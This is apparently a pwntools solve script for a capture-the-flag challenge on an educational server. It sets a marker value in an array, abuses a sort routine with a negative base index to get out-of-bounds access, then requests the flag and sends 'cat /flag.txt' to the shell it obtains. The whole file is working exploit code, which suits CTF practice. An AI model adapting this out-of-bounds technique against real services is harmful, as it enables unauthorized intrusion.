from pwn import *

BACKDOOR = 0xdeadbeef

conn = remote('edu-ctf.zoolab.org', 10101)
conn.sendlineafter(b' >', b'1') # change value
conn.sendlineafter(b' >', b'0') # index
conn.sendlineafter(b' >', str(BACKDOOR).encode()) # value
conn.sendlineafter(b' >', b'2') # sort
conn.sendlineafter(b' >', b'-1') # base
conn.sendlineafter(b' >', b'2') # len
conn.sendlineafter(b' >', b'1') # (try) dsc
first_num = int(conn.readline().decode().split('[')[1].split(',')[0].strip())
if first_num == BACKDOOR:
    conn.sendlineafter(b' >', b'2') # sort
    conn.sendlineafter(b' >', b'-1') # base
    conn.sendlineafter(b' >', b'2') # len
    conn.sendlineafter(b' >', b'0') # asc
    first_num = int(conn.readline().decode().split('[')[1].split(',')[0].strip())
assert first_num != BACKDOOR
conn.sendlineafter(b' >', b'3') # get flag
conn.sendline(b'cat /flag.txt') 
conn.interactive()

